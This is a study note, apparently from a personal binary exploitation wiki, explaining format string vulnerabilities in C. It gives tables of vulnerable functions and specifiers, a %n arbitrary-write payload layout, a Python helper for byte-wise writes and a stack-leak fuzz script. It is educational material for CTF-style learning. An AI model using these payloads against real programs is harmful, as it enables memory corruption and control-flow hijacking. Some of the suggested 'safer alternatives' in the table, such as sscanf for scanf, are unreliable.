Navigation: [[Binary Exploitation]]

---
# Introduction
Format string vulnerabilities occur when a user input is used directly in a formatting function without any validation. These functions interpret format specifiers to read or write memory. When we can control the format string, we can control it to read or write unintended memory.
# Table of Contents
# List of Vulnerable Functions
| Function       | Use                                         | Why It's Vulnerable                                   | Safer Alternative          |
|----------------|---------------------------------------------|-----------------------------------------------------|----------------------------|
| `printf`       | Prints formatted output to stdout           | Accepts user-controlled format strings              | `printf_s`, `snprintf`    |
| `fprintf`      | Prints formatted output to a file           | Accepts user-controlled format strings              | `fprintf_s`               |
| `sprintf`      | Writes formatted output to a string buffer  | Lacks buffer size checks, accepts uncontrolled input| `snprintf`                |
| `vsprintf`     | Writes formatted output using a va_list     | Lacks buffer size checks, accepts uncontrolled input| `vsnprintf`               |
| `scanf`        | Reads formatted input                      | Accepts uncontrolled format strings, stack overflows| `sscanf`                  |
| `vscanf`       | Reads formatted input using a va_list       | Accepts uncontrolled format strings, stack overflows| `vsscanf`                 |
| `snprintf`     | Writes formatted output with buffer size    | Can still misuse user-controlled format strings     | Validate inputs explicitly|
| `vprintf`      | Prints formatted output using a va_list     | Accepts user-controlled format strings              | Validate inputs explicitly|
# Format Specifiers

| Format Specifier | Output                                   | Description                                                               |
| ---------------- | ---------------------------------------- | ------------------------------------------------------------------------- |
| `%d`             | Signed decimal integer                   | Prints an integer in base 10 (signed).                                    |
| `%i`             | Signed decimal integer                   | Similar to `%d`, accepts decimal, octal, or hex input.                    |
| `%u`             | Unsigned decimal integer                 | Prints an unsigned integer in base 10.                                    |
| `%o`             | Unsigned octal integer                   | Prints an integer in base 8.                                              |
| `%x`             | Unsigned hexadecimal integer (lowercase) | Prints an integer in base 16 using lowercase letters.                     |
| `%X`             | Unsigned hexadecimal integer (uppercase) | Prints an integer in base 16 using uppercase letters.                     |
| `%f`             | Decimal floating-point number            | Prints a floating-point number with a fixed number of decimal places.     |
| `%e`             | Scientific notation (lowercase)          | Prints a floating-point number in scientific notation with lowercase `e`. |
| `%E`             | Scientific notation (uppercase)          | Prints a floating-point number in scientific notation with uppercase `E`. |
| `%g`             | Shorter of `%f` or `%e` (lowercase)      | Chooses the more compact form between `%f` and `%e`.                      |
| `%G`             | Shorter of `%f` or `%E` (uppercase)      | Chooses the more compact form between `%f` and `%E`.                      |
| `%c`             | Single character                         | Prints the corresponding character for an integer value.                  |
| `%s`             | Null-terminated string                   | Prints a string starting at a given memory address.                       |
| `%p`             | Pointer address                          | Prints a memory address in hexadecimal format.                            |
| `%n`             | Number of characters written so far      | Writes the count of printed characters to an integer pointer.             |
| `%%`             | Literal `%`                              | Prints a literal `%` symbol.                                              |
Of these specifiers, here's the main ones we'll be interested in:
1. `%p`
2. `%n`
3. `%x`
4. `%d`
5. `%s`

Another very useful character is `$`. Printing `%2$d` prints the second argument to `printf` as a decimal. Note that we'll be grabbing arguments to `printf` in the order of calling convention, eventually reaching data on the stack.

Note that when we do an arbitrary write, our payload will look like this:
```
<little endian target addr>%<pad size>x%<arg buf location>n

In this, we'll be writing our target address, followed by a padding. The padding must be a decimal number representing the hex value we want to write to the target address. Lastly, we'll need the location of our input string on the stack.

We need the input string since %n reads the pointer at the given address to write there, so by writing the target address to that string, we can then utilize the pointer

Note that with padding, we'll need to subtract the total number of address bytes we wrote.

Next, we can send multiple writes to smaller portions of memory (we should, padding will print whitespaces and it'll be impossible with %ln due to the number of spaces needed to be printed). Our payload will looking something like (ignore the spaces, they exist for the sake of formatting):
<addr 1> <addr 2> <addr 3> <addr 4>
% <addr 1 pad - written bytes> x <arg buf> n
% <addr 2 pad - written bytes> x <arg buf + 1> n
...

Note that we'll need to be substracting total number of written bytes from each segment.
```

Here's a helper script to do that:
```python
def arb_write_8(addr,data):
    payload = b''
    if data == 0: #If the amount is 0, we shouldn't print anything before %n
        payload = f"%10$hhn".encode()
    else:
        payload = f"%{data}c%10$hhn".encode()
    
    #Calculate the padding for us to be able to put a pointer afterwards. The fmt_string for 8bit arbitrary write should never go over 16.
    padding = b'A'*(16-len(payload))
    payload+=padding

    #Add the pointer we want to write to
    payload+=p64(addr)

    # Send the payload
    send_format_string(payload)

def arb_write_64(addr,data):
    #Calculate all bytes to write
    to_write = [
        data & 0xff,
        (data >> 8) & 0xff,
        (data >> 16) & 0xff,
        (data >> 24) & 0xff,
        (data >> 32) & 0xff,
        (data >> 40) & 0xff,
        (data >> 48) & 0xff,
        (data >> 56) & 0xff,
        ]
    #Write everything one byte at a time
    for i in range(0,len(to_write)):
        arb_write_8(addr+i,to_write[i])
```

```python
# Simple fuzz script

for i in range(100):
    try:
        # Format the counter
        # e.g. %2$s will attempt to print [i]th pointer/string/hex/char/int
        p.sendline('%{}$x'.format(i).encode())
        # Receive the response
        result = p.recvline().decode()
        # If the item from the stack isn't empty, print it
        if result:
            print(str(i) + ': ' + str(result).strip())
    except EOFError:
        pass
```
# Common Attack Paths
1. Leaking Values
2. GOT Overwrite



# Further Reading
https://github.com/Mymaqn/The-danger-of-repetivive-format-string-vulnerabilities-and-abusing-exit-on-full-RELRO

https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html

https://ir0nstone.gitbook.io/notes/binexp/stack/canaries

---
Navigation: [[Binary Exploitation]]